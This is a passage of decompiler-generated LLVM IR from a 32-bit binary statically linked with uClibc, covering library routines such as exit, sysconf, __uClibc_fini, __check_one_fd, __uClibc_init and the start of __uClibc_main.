  store i32 %v1_804b3b2, i32* %eax.global-to-local, align 4
  %v0_804b3b7 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804b3b7, i32* @edx, align 4
  %v1_804b3b9 = inttoptr i32 %v1_804b3b2 to i32*
  store i32 34, i32* %v1_804b3b9, align 4
  %v0_804b3bf.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804b3bf

dec_label_pc_804b3bf:                             ; preds = %dec_label_pc_804b3ae, %dec_label_pc_804b39b, %dec_label_pc_804b3b2
  %v0_804b3bf = phi i32 [ %v0_804b39b, %dec_label_pc_804b3ae ], [ %v0_804b39b, %dec_label_pc_804b39b ], [ %v0_804b3bf.pre, %dec_label_pc_804b3b2 ]
  store i32 %v0_804b3bf, i32* %eax.global-to-local, align 4
  %v3_804b3c1 = trunc i32 %v0_804b3bf to i8
  %v4_804b3c1 = icmp eq i8 %v3_804b3c1, 0
  %v0_804b3ca.pre = load i32, i32* @edx, align 4
  br i1 %v4_804b3c1, label %dec_label_pc_804b3c7, label %dec_label_pc_804b3c5

dec_label_pc_804b3c5:                             ; preds = %dec_label_pc_804b3bf
  %v1_804b3c5 = sub i32 0, %v0_804b3ca.pre
  store i32 %v1_804b3c5, i32* @edx, align 4
  br label %dec_label_pc_804b3c7

dec_label_pc_804b3c7:                             ; preds = %dec_label_pc_804b3bf, %dec_label_pc_804b3c5
  %v0_804b3ca = phi i32 [ %v1_804b3c5, %dec_label_pc_804b3c5 ], [ %v0_804b3ca.pre, %dec_label_pc_804b3bf ]
  store i32 %v0_804b3ca, i32* %eax.global-to-local, align 4
  %v2_804b3cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b3cc, i32* @ebx, align 4
  ret i32 %v0_804b3ca

; uselistorder directives
  uselistorder i32 %v0_804b3ca, { 1, 0 }
  uselistorder i32 %v0_804b3bf, { 1, 0 }
  uselistorder i32 %v0_804b360, { 0, 2, 1 }
  uselistorder i32 %v1_804b35f, { 1, 0 }
  uselistorder i32 %v2_804b35b, { 1, 0 }
  uselistorder i32 %v1_804b358, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_804b387, { 1, 0 }
  uselistorder i32 %v0_804b340, { 1, 0 }
  uselistorder i32 %v4_804b36e, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_804b332, { 1, 0, 2 }
  uselistorder i32 %v2_804b316, { 1, 0 }
  uselistorder i32 %v1_804b30f, { 1, 0 }
  uselistorder i32 %v1_804b308, { 1, 0, 2 }
  uselistorder i32 %v0_804b307, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_804b2d6.lcssa, { 1, 0 }
  uselistorder i32 %v0_804b2d5.lcssa, { 1, 0 }
  uselistorder i32 %v1_804b2d5, { 0, 3, 2, 1 }
  uselistorder i32 %v4_804b2c9, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_804b2c3, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 -17, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b3c7, { 1, 0 }
  uselistorder label %dec_label_pc_804b3bf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b39b, { 1, 0 }
  uselistorder label %dec_label_pc_804b358, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b342, { 1, 0 }
  uselistorder label %dec_label_pc_804b323, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b319, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b2f5, { 1, 0 }
  uselistorder label %dec_label_pc_804b2f4, { 1, 0 }
  uselistorder label %dec_label_pc_804b2d5, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_804b3e7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b3e7, i32* @ebx, align 4
  %v2_804b3ec = call i32 @__pthread_return_void(i32 %v2_804b3e7, i32 134526403)
  %v1_804b3f8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052140.66 to i32))
  %v0_804b3fd = load i32, i32* @global_var_8052504.67, align 4
  store i32 %v0_804b3fd, i32* @eax, align 4
  %v1_804b405 = icmp eq i32 %v0_804b3fd, 0
  br i1 %v1_804b405, label %dec_label_pc_804b412, label %dec_label_pc_804b409

dec_label_pc_804b409:                             ; preds = %entry
  %v0_804b40c = load i32, i32* @esi, align 4
  %v1_804b40d = call i32 @unknown_0(i32 %v0_804b40c)
  store i32 %v1_804b40d, i32* @eax, align 4
  br label %dec_label_pc_804b412

dec_label_pc_804b412:                             ; preds = %entry, %dec_label_pc_804b409
  %v2_804b417 = call i32 @__pthread_return_void(i32 %v2_804b3e7, i32 1)
  %v0_804b41c = call i32 @__GI___uClibc_fini()
  %v0_804b42d = call i32 @_stdio_term()
  %v0_804b435 = load i32, i32* @esi, align 4
  %v1_804b436 = call i32 @__GI__exit(i32 %v0_804b435)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_804b412, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_804b45b [
    i32 0, label %dec_label_pc_804b46b
    i32 1, label %dec_label_pc_804b550
    i32 2, label %dec_label_pc_804b475
    i32 3, label %dec_label_pc_804b47f
    i32 4, label %dec_label_pc_804b489
    i32 5, label %dec_label_pc_804b51f
    i32 6, label %dec_label_pc_804b491
    i32 7, label %dec_label_pc_804b451
    i32 8, label %dec_label_pc_804b451
    i32 9, label %dec_label_pc_804b451
    i32 10, label %dec_label_pc_804b451
    i32 11, label %dec_label_pc_804b451
    i32 12, label %dec_label_pc_804b451
    i32 13, label %dec_label_pc_804b451
    i32 14, label %dec_label_pc_804b451
    i32 15, label %dec_label_pc_804b451
    i32 16, label %dec_label_pc_804b451
    i32 17, label %dec_label_pc_804b451
    i32 18, label %dec_label_pc_804b451
    i32 19, label %dec_label_pc_804b451
    i32 20, label %dec_label_pc_804b451
    i32 21, label %dec_label_pc_804b451
    i32 22, label %dec_label_pc_804b451
    i32 23, label %dec_label_pc_804b550
    i32 24, label %dec_label_pc_804b550
    i32 25, label %dec_label_pc_804b55c
    i32 26, label %dec_label_pc_804b52d
    i32 27, label %dec_label_pc_804b550
    i32 28, label %dec_label_pc_804b4a3
    i32 29, label %dec_label_pc_804b526
    i32 30, label %dec_label_pc_804b49b
    i32 31, label %dec_label_pc_804b53b
    i32 32, label %dec_label_pc_804b550
    i32 33, label %dec_label_pc_804b550
    i32 34, label %dec_label_pc_804b550
    i32 35, label %dec_label_pc_804b534
    i32 36, label %dec_label_pc_804b563
    i32 37, label %dec_label_pc_804b56a
    i32 38, label %dec_label_pc_804b563
    i32 39, label %dec_label_pc_804b4ad
    i32 40, label %dec_label_pc_804b571
    i32 41, label %dec_label_pc_804b550
    i32 42, label %dec_label_pc_804b53b
    i32 43, label %dec_label_pc_804b56a
    i32 44, label %dec_label_pc_804b578
    i32 45, label %dec_label_pc_804b56a
    i32 46, label %dec_label_pc_804b526
    i32 47, label %dec_label_pc_804b526
    i32 48, label %dec_label_pc_804b526
    i32 49, label %dec_label_pc_804b550
    i32 50, label %dec_label_pc_804b550
    i32 51, label %dec_label_pc_804b526
    i32 52, label %dec_label_pc_804b526
    i32 53, label %dec_label_pc_804b550
    i32 54, label %dec_label_pc_804b550
    i32 55, label %dec_label_pc_804b550
    i32 56, label %dec_label_pc_804b550
    i32 57, label %dec_label_pc_804b550
    i32 58, label %dec_label_pc_804b550
    i32 59, label %dec_label_pc_804b550
    i32 60, label %dec_label_pc_804b550
    i32 61, label %dec_label_pc_804b550
    i32 62, label %dec_label_pc_804b550
    i32 63, label %dec_label_pc_804b550
    i32 64, label %dec_label_pc_804b550
    i32 65, label %dec_label_pc_804b550
    i32 66, label %dec_label_pc_804b550
    i32 67, label %dec_label_pc_804b451
    i32 68, label %dec_label_pc_804b451
    i32 69, label %dec_label_pc_804b534
    i32 70, label %dec_label_pc_804b534
    i32 71, label %dec_label_pc_804b534
    i32 72, label %dec_label_pc_804b53b
    i32 73, label %dec_label_pc_804b542
    i32 74, label %dec_label_pc_804b549
    i32 75, label %dec_label_pc_804b4b7
    i32 76, label %dec_label_pc_804b549
    i32 77, label %dec_label_pc_804b451
    i32 78, label %dec_label_pc_804b451
    i32 79, label %dec_label_pc_804b451
    i32 80, label %dec_label_pc_804b451
    i32 81, label %dec_label_pc_804b451
    i32 82, label %dec_label_pc_804b451
    i32 83, label %dec_label_pc_804b451
    i32 84, label %dec_label_pc_804b451
    i32 85, label %dec_label_pc_804b550
    i32 86, label %dec_label_pc_804b550
    i32 87, label %dec_label_pc_804b52d
    i32 88, label %dec_label_pc_804b4c1
    i32 89, label %dec_label_pc_804b4cb
    i32 90, label %dec_label_pc_804b542
    i32 91, label %dec_label_pc_804b451
    i32 92, label %dec_label_pc_804b451
    i32 93, label %dec_label_pc_804b451
    i32 94, label %dec_label_pc_804b451
    i32 95, label %dec_label_pc_804b526
    i32 96, label %dec_label_pc_804b550
    i32 97, label %dec_label_pc_804b550
    i32 98, label %dec_label_pc_804b451
    i32 99, label %dec_label_pc_804b451
    i32 100, label %dec_label_pc_804b451
    i32 101, label %dec_label_pc_804b4d5
    i32 102, label %dec_label_pc_804b518
    i32 103, label %dec_label_pc_804b555
    i32 104, label %dec_label_pc_804b52d
    i32 105, label %dec_label_pc_804b4df
    i32 106, label %dec_label_pc_804b53b
    i32 107, label %dec_label_pc_804b53b
    i32 108, label %dec_label_pc_804b51f
    i32 109, label %dec_label_pc_804b55c
    i32 110, label %dec_label_pc_804b578
    i32 111, label %dec_label_pc_804b518
    i32 112, label %dec_label_pc_804b555
    i32 113, label %dec_label_pc_804b578
    i32 114, label %dec_label_pc_804b4e9
    i32 115, label %dec_label_pc_804b571
    i32 116, label %dec_label_pc_804b550
    i32 117, label %dec_label_pc_804b550
    i32 118, label %dec_label_pc_804b4f3
    i32 119, label %dec_label_pc_804b4fd
    i32 120, label %dec_label_pc_804b56a
    i32 121, label %dec_label_pc_804b52d
    i32 122, label %dec_label_pc_804b52d
    i32 123, label %dec_label_pc_804b52d
    i32 124, label %dec_label_pc_804b52d
    i32 125, label %dec_label_pc_804b451
    i32 126, label %dec_label_pc_804b451
    i32 127, label %dec_label_pc_804b550
    i32 128, label %dec_label_pc_804b550
    i32 129, label %dec_label_pc_804b451
    i32 130, label %dec_label_pc_804b451
    i32 131, label %dec_label_pc_804b550
    i32 149, label %dec_label_pc_804b504
  ]

dec_label_pc_804b451:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b45b:                             ; preds = %entry
  %v1_804b45b = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804b460 = inttoptr i32 %v1_804b45b to i32*
  store i32 22, i32* %v1_804b460, align 4
  br label %dec_label_pc_804b550

dec_label_pc_804b46b:                             ; preds = %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b475:                             ; preds = %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b47f:                             ; preds = %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b489:                             ; preds = %entry
  %v0_804b48c = call i32 @getdtablesize()
  br label %dec_label_pc_804b491

dec_label_pc_804b491:                             ; preds = %entry, %dec_label_pc_804b489
  br label %dec_label_pc_804b57d

dec_label_pc_804b49b:                             ; preds = %entry
  %v0_804b49e = call i32 @__GI_getpagesize()
  br label %dec_label_pc_804b4a3

dec_label_pc_804b4a3:                             ; preds = %entry, %dec_label_pc_804b49b
  br label %dec_label_pc_804b57d

dec_label_pc_804b4ad:                             ; preds = %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b4b7:                             ; preds = %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b4c1:                             ; preds = %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b4cb:                             ; preds = %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b4d5:                             ; preds = %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b4df:                             ; preds = %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b4e9:                             ; preds = %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b4f3:                             ; preds = %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b4fd:                             ; preds = %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b504:                             ; preds = %entry
  %v5_804b50a = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_804b512 = icmp slt i32 %v5_804b50a, 0
  %v1_804b514 = icmp eq i1 %v2_804b512, false
  br i1 %v1_804b514, label %dec_label_pc_804b526, label %dec_label_pc_804b550

dec_label_pc_804b518:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b51f:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b526:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804b504
  br label %dec_label_pc_804b57d

dec_label_pc_804b52d:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b534:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b53b:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b542:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b549:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b550:                             ; preds = %dec_label_pc_804b504, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804b45b
  br label %dec_label_pc_804b57d

dec_label_pc_804b555:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b55c:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b563:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b56a:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b571:                             ; preds = %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b578:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_804b57d

dec_label_pc_804b57d:                             ; preds = %dec_label_pc_804b571, %dec_label_pc_804b56a, %dec_label_pc_804b563, %dec_label_pc_804b55c, %dec_label_pc_804b555, %dec_label_pc_804b549, %dec_label_pc_804b542, %dec_label_pc_804b53b, %dec_label_pc_804b534, %dec_label_pc_804b52d, %dec_label_pc_804b51f, %dec_label_pc_804b518, %dec_label_pc_804b526, %dec_label_pc_804b4fd, %dec_label_pc_804b4f3, %dec_label_pc_804b4e9, %dec_label_pc_804b4df, %dec_label_pc_804b4d5, %dec_label_pc_804b4cb, %dec_label_pc_804b4c1, %dec_label_pc_804b4b7, %dec_label_pc_804b4ad, %dec_label_pc_804b4a3, %dec_label_pc_804b491, %dec_label_pc_804b47f, %dec_label_pc_804b475, %dec_label_pc_804b46b, %dec_label_pc_804b451, %dec_label_pc_804b550, %dec_label_pc_804b578
  %v0_804b580 = phi i32 [ 255, %dec_label_pc_804b571 ], [ 2048, %dec_label_pc_804b56a ], [ 99, %dec_label_pc_804b563 ], [ 20, %dec_label_pc_804b55c ], [ -128, %dec_label_pc_804b555 ], [ 1024, %dec_label_pc_804b549 ], [ 4, %dec_label_pc_804b542 ], [ 32, %dec_label_pc_804b53b ], [ 256, %dec_label_pc_804b534 ], [ 2147483647, %dec_label_pc_804b52d ], [ 16, %dec_label_pc_804b51f ], [ 127, %dec_label_pc_804b518 ], [ 200112, %dec_label_pc_804b526 ], [ 9, %dec_label_pc_804b4fd ], [ 65535, %dec_label_pc_804b4f3 ], [ -32768, %dec_label_pc_804b4e9 ], [ -2147483648, %dec_label_pc_804b4df ], [ 8, %dec_label_pc_804b4d5 ], [ 500, %dec_label_pc_804b4cb ], [ 4096, %dec_label_pc_804b4c1 ], [ 16384, %dec_label_pc_804b4b7 ], [ 1000, %dec_label_pc_804b4ad ], [ 32768, %dec_label_pc_804b4a3 ], [ 6, %dec_label_pc_804b491 ], [ 65536, %dec_label_pc_804b47f ], [ 100, %dec_label_pc_804b475 ], [ 131072, %dec_label_pc_804b46b ], [ 1, %dec_label_pc_804b451 ], [ -1, %dec_label_pc_804b550 ], [ 32767, %dec_label_pc_804b578 ]
  ret i32 %v0_804b580

; uselistorder directives
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 50, { 1, 0 }
  uselistorder i32 30, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804b57d, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_804b550, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_804b526, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804b4a3, { 1, 0 }
  uselistorder label %dec_label_pc_804b491, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b584 = load i32, i32* @ebx, align 4
  store i32 %v0_804b584, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), label %dec_label_pc_804b598, label %dec_label_pc_804b5a5

dec_label_pc_804b598:                             ; preds = %entry, %dec_label_pc_804b598
  %v1_804b59f8 = phi i32 [ %v1_804b59f, %dec_label_pc_804b598 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_804b59f.70 to i32), i32* %stack_var_-16, align 4
  %v5_804b598 = mul i32 %v1_804b59f8, 4
  %v6_804b598 = add i32 %v5_804b598, ptrtoint (i32* @global_var_8052000.69 to i32)
  %v7_804b598 = inttoptr i32 %v6_804b598 to i32*
  %v8_804b598 = load i32, i32* %v7_804b598, align 4
  call void @__pseudo_call(i32 %v8_804b598)
  %v0_804b59f.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b59f = add i32 %v0_804b59f.pre, -1
  store i32 %v1_804b59f, i32* %ebx.global-to-local, align 4
  %v10_804b5a0 = icmp eq i32 %v0_804b59f.pre, 0
  %v1_804b5a3 = icmp eq i1 %v10_804b5a0, false
  br i1 %v1_804b5a3, label %dec_label_pc_804b598, label %dec_label_pc_804b5a5

dec_label_pc_804b5a5:                             ; preds = %dec_label_pc_804b598, %entry
  %v0_804b5a5 = load i32, i32* @global_var_8052514.71, align 4
  %v1_804b5aa = icmp eq i32 %v0_804b5a5, 0
  br i1 %v1_804b5aa, label %dec_label_pc_804b5b0, label %dec_label_pc_804b5ae

dec_label_pc_804b5ae:                             ; preds = %dec_label_pc_804b5a5
  %v0_804b5ae = load i32, i32* %stack_var_-16, align 4
  %v1_804b5ae = call i32 @unknown_0(i32 %v0_804b5ae)
  br label %dec_label_pc_804b5b0

dec_label_pc_804b5b0:                             ; preds = %dec_label_pc_804b5ae, %dec_label_pc_804b5a5
  %v0_804b5b0 = load i32, i32* @global_var_8052518.72, align 8
  %v1_804b5b6 = icmp eq i32 %v0_804b5b0, 0
  br i1 %v1_804b5b6, label %dec_label_pc_804b5bf, label %dec_label_pc_804b5ba

dec_label_pc_804b5ba:                             ; preds = %dec_label_pc_804b5b0
  %v2_804b5ba = load i32, i32* %stack_var_-16, align 4
  %v1_804b5bd = call i32 @unknown_0(i32 %v2_804b5ba)
  br label %dec_label_pc_804b5bf

dec_label_pc_804b5bf:                             ; preds = %dec_label_pc_804b5ba, %dec_label_pc_804b5b0
  %v2_804b5bf = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_804b5bf

; uselistorder directives
  uselistorder i32 %v1_804b59f, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804b598, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804b5c6 = load i32, i32* @eax, align 4
  ret i32 %v0_804b5c6
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804b5c7 = load i32, i32* @esi, align 4
  %v0_804b5c8 = load i32, i32* @ebx, align 4
  store i32 %v0_804b5c8, i32* %stack_var_-8, align 4
  %v0_804b5cc = load i32, i32* @eax, align 4
  store i32 %v0_804b5cc, i32* @esi, align 4
  %v0_804b5ce = load i32, i32* @edx, align 4
  store i32 %v0_804b5ce, i32* @ebx, align 4
  %v4_804b5d3 = call i32 @__libc_fcntl(i32 %v0_804b5cc, i32 1, i32 %tmp6)
  %v1_804b5db = add i32 %v4_804b5d3, 1
  %v8_804b5db = icmp eq i32 %v1_804b5db, 0
  %v1_804b5dc = icmp eq i1 %v8_804b5db, false
  br i1 %v1_804b5dc, label %dec_label_pc_804b5f7, label %dec_label_pc_804b5de

dec_label_pc_804b5de:                             ; preds = %entry
  %v0_804b5e0 = load i32, i32* @ebx, align 4
  %v5_804b5e6 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80505c0.73, i32 0, i32 0), i32 %v0_804b5e0, i32 %v1_804b5db)
  %v1_804b5ee = load i32, i32* @esi, align 4
  %v12_804b5ee = icmp eq i32 %v5_804b5e6, %v1_804b5ee
  br i1 %v12_804b5ee, label %dec_label_pc_804b5f7, label %dec_label_pc_804b5f2

dec_label_pc_804b5f2:                             ; preds = %dec_label_pc_804b5de
  %v0_804b5f2 = call i32 @abort()
  br label %dec_label_pc_804b5f7

dec_label_pc_804b5f7:                             ; preds = %dec_label_pc_804b5de, %entry, %dec_label_pc_804b5f2
  %v2_804b5f7 = load i32, i32* %stack_var_-12, align 4
  %v2_804b5f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b5f8, i32* @ebx, align 4
  store i32 %v0_804b5c7, i32* @esi, align 4
  ret i32 %v2_804b5f7

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804b5f7, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_804b5fe = load i8, i8* @global_var_805251c.74, align 4
  %v1_804b5fe = icmp eq i8 %v0_804b5fe, 0
  %v1_804b605 = icmp eq i1 %v1_804b5fe, false
  br i1 %v1_804b605, label %entry.dec_label_pc_804b637_crit_edge, label %dec_label_pc_804b607

entry.dec_label_pc_804b637_crit_edge:             ; preds = %entry
  %v0_804b63a.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804b637

dec_label_pc_804b607:                             ; preds = %entry
  store i8 1, i8* @global_var_805251c.74, align 4
  store i32 4096, i32* @global_var_8052510.75, align 16
  %v0_804b632 = call i32 @_stdio_init()
  br label %dec_label_pc_804b637

dec_label_pc_804b637:                             ; preds = %entry.dec_label_pc_804b637_crit_edge, %dec_label_pc_804b607
  %v0_804b63a = phi i32 [ %v0_804b63a.pre, %entry.dec_label_pc_804b637_crit_edge ], [ %v0_804b632, %dec_label_pc_804b607 ]
  ret i32 %v0_804b63a

; uselistorder directives
  uselistorder i8* @global_var_805251c.74, { 1, 0 }
  uselistorder label %dec_label_pc_804b637, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp30 = ptrtoint i32* %arg2 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_804b63d = load i32, i32* @esi, align 4
  store i32 %tmp30, i32* @edi, align 4
  store i32 %arg6, i32* @global_var_8052508.76, align 8
  store i32 %arg5, i32* @global_var_8052518.72, align 8
  %v2_804b672 = mul i32 %arg1, 4
  %v3_804b672 = add i32 %tmp30, %v2_804b672
  %v1_804b675 = add i32 %v3_804b672, 4
  store i32 %v1_804b675, i32* @global_var_805250c.77, align 4
  %v3_804b67d = load i32, i32* %arg2, align 4
  %v14_804b67d = icmp eq i32 %v1_804b675, %v3_804b67d
  %v1_804b67f = icmp eq i1 %v14_804b67d, false
  br i1 %v1_804b67f, label %dec_label_pc_804b687, label %dec_label_pc_804b681

dec_label_pc_804b681:                             ; preds = %entry
  store i32 %v3_804b672, i32* @global_var_805250c.77, align 4
  br label %dec_label_pc_804b687

dec_label_pc_804b687:                             ; preds = %entry, %dec_label_pc_804b681
  store i32 0, i32* %stack_var_-168, align 4
  %v2_804b68c = ptrtoint i32* %stack_var_-136 to i32
  %v3_804b691 = bitcast i32* %stack_var_-136 to i8*
  %v4_804b691 = call i32 @__GI_memset(i8* %v3_804b691, i32 0, i32 120)
  %v0_804b696 = load i32, i32* @global_var_805250c.77, align 4
  br label %dec_label_pc_804b69e

dec_label_pc_804b69e:                             ; preds = %dec_label_pc_804b69e, %dec_label_pc_804b687
  %v0_804b69e = phi i32 [ %v1_804b6a1, %dec_label_pc_804b69e ], [ %v0_804b696, %dec_label_pc_804b687 ]
  %v1_804b69e = inttoptr i32 %v0_804b69e to i32*
  %v2_804b69e = load i32, i32* %v1_804b69e, align 4
  %v3_804b69e = icmp eq i32 %v2_804b69e, 0
  %v1_804b6a1 = add i32 %v0_804b69e, 4
  %v1_804b6a4 = icmp eq i1 %v3_804b69e, false
  br i1 %v1_804b6a4, label %dec_label_pc_804b69e, label %dec_label_pc_804b6c5.preheader

dec_label_pc_804b6c5.preheader:                   ; preds = %dec_label_pc_804b69e
  store i32 %v1_804b6a1, i32* @ebx, align 4
  %v1_804b6c51 = inttoptr i32 %v1_804b6a1 to i32*
  %v2_804b6c52 = load i32, i32* %v1_804b6c51, align 4
  %v3_804b6c53 = icmp eq i32 %v2_804b6c52, 0
  %v1_804b6c810 = icmp eq i1 %v3_804b6c53, false
  br i1 %v1_804b6c810, label %dec_label_pc_804b6aa.lr.ph, label %dec_label_pc_804b6ca

dec_label_pc_804b6aa.lr.ph:                       ; preds = %dec_label_pc_804b6c5.preheader
  %v3_804b68a = ptrtoint i32* %stack_var_-168 to i32
  %v3_804b6b5 = add i32 %v3_804b68a, 32
  br label %dec_label_pc_804b6aa

dec_label_pc_804b6aa:                             ; preds = %dec_label_pc_804b6aa.lr.ph, %dec_label_pc_804b6c2
  %v1_804b6b5 = phi i32 [ %v2_804b6c52, %dec_label_pc_804b6aa.lr.ph ], [ %v2_804b6c5, %dec_label_pc_804b6c2 ]
  %v0_804b6b4 = phi i32 [ %v1_804b6a1, %dec_label_pc_804b6aa.lr.ph ], [ %v1_804b6c2, %dec_label_pc_804b6c2 ]
  %v6_804b6af = icmp ugt i32 %v1_804b6b5, 14
  br i1 %v6_804b6af, label %dec_label_pc_804b6c2, label %dec_label_pc_804b6b1

dec_label_pc_804b6b1:                             ; preds = %dec_label_pc_804b6aa
  store i32 %v0_804b6b4, i32* %stack_var_-168, align 4
  %v2_804b6b5 = mul i32 %v1_804b6b5, 8
  %v4_804b6b5 = add i32 %v3_804b6b5, %v2_804b6b5
  %v3_804b6ba = inttoptr i32 %v4_804b6b5 to i16*
  %v4_804b6ba = call i32 @memcpy(i16* %v3_804b6ba, i32 %v0_804b6b4, i32 8)
  %v0_804b6c2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804b6c2

